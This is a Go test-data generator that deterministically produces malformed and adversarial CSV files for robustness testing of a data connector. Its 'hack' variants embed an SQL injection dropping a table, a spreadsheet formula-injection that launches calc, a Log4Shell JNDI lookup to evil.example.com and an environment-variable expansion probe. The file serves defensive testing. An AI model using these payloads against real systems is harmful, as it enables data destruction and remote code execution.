package generator

import (
	"strconv"
	"strings"
)

// SourceCase is one adversarial CSV source plus its attribution metadata.
type SourceCase struct {
	CSV      string // full file content, written to the per-seed path
	Category string // logical | weird | textual | hack
	Variant  string // e.g. "sqli-cell"
	Field    string // where the mutation lands: "header" | "row" | "file"
}

const sourceHeader = "code,label,amount"

// baselineCSV is the benign, valid source: a safe header (deliberately no "id"
// column, which would trip a known HUB DDL collision) plus three rows.
func baselineCSV() string {
	return sourceHeader + "\n" +
		"A001,alpha,10\n" +
		"A002,beta,20\n" +
		"A003,gamma,30\n"
}

// sourceVariant is one adversarial mutation. build returns the full CSV content.
type sourceVariant struct {
	name  string
	field string
	build func() string
}

var sourceVariantsByCategory = map[string][]sourceVariant{
	"logical": {
		{"ragged-extra", "row", func() string { return sourceHeader + "\nA001,alpha,10,EXTRA\n" }},
		{"ragged-short", "row", func() string { return sourceHeader + "\nA001,alpha\n" }},
		{"duplicate-header", "header", func() string { return "code,label,code\nA001,alpha,10\n" }},
		{"header-only", "file", func() string { return sourceHeader + "\n" }},
		{"empty-file", "file", func() string { return "" }},
		{"type-confusion", "row", func() string { return sourceHeader + "\nA001,alpha,twenty\n" }},
		{"all-empty-values", "row", func() string { return sourceHeader + "\nA001,,\n" }},
	},
	"weird": {
		{"nul-in-cell", "row", func() string { return sourceHeader + "\nA001,al\x00pha,10\n" }},
		{"huge-cell", "row", func() string { return sourceHeader + "\nA001," + strings.Repeat("x", 1_000_000) + ",10\n" }},
		{"many-columns", "header", func() string {
			cols := make([]string, 2000)
			row := make([]string, 2000)
			for i := range cols {
				cols[i] = "c" + strconv.Itoa(i)
				row[i] = "v"
			}
			return strings.Join(cols, ",") + "\n" + strings.Join(row, ",") + "\n"
		}},
		{"mixed-eol", "row", func() string { return sourceHeader + "\r\nA001,alpha,10\rA002,beta,20\n" }},
		{"trailing-delimiter", "row", func() string { return sourceHeader + "\nA001,alpha,10,\n" }},
		{"crlf-injection", "row", func() string { return sourceHeader + "\nA001,\"al\r\npha\",10\n" }},
		{"deeply-nested-quotes", "row", func() string { return sourceHeader + "\nA001,\"\"\"\"hello\"\"\"\",10\n" }},
	},
	"textual": {
		{"bidi-header", "header", func() string { return "code,la\u202ebel,amount\nA001,alpha,10\n" }},
		{"confusable-header", "header", func() string { return "code,label,\u0430mount\nA001,alpha,10\n" }}, // Cyrillic U+0430
		{"sql-keyword-header", "header", func() string { return "select,drop table,amount\nA001,alpha,10\n" }},
		{"bom-prefix", "file", func() string { return "\ufeff" + baselineCSV() }},
		{"non-utf8-cell", "row", func() string { return sourceHeader + "\nA001,\xff\xfe,10\n" }},
		{"zero-width-joiner", "row", func() string { return sourceHeader + "\nA001,al\u200dpha,10\n" }},
		{"rtl-in-data-cell", "row", func() string { return sourceHeader + "\nA001,al\u202epha,10\n" }},
	},
	"hack": {
		{"sqli-cell", "row", func() string { return sourceHeader + "\nA001,'; DROP TABLE core.connector;--,10\n" }},
		{"formula-injection", "row", func() string { return sourceHeader + "\nA001,=cmd|' /C calc'!A0,10\n" }},
		{"control-char-cell", "row", func() string { return sourceHeader + "\nA001,abc\x01,10\n" }},
		{"log4shell-in-cell", "row", func() string {
			return sourceHeader + "\nA001,${jndi:ldap://evil.example.com/x},10\n"
		}},
		{"env-expansion-in-cell", "row", func() string { return sourceHeader + "\nA001,${HOME},10\n" }},
	},
}

// GenerateSource deterministically synthesises one adversarial CSV from a seed by
// chaining splitmix64: category (shared with Generate) -> variant. Count-agnostic.
func GenerateSource(seed int64) SourceCase {
	h := splitmix64(uint64(seed))
	cat := categories[int(h%uint64(len(categories)))]

	h = splitmix64(h)
	vs := sourceVariantsByCategory[cat]
	v := vs[int(h%uint64(len(vs)))]

	return SourceCase{
		CSV:      v.build(),
		Category: cat,
		Variant:  v.name,
		Field:    v.field,
	}
}
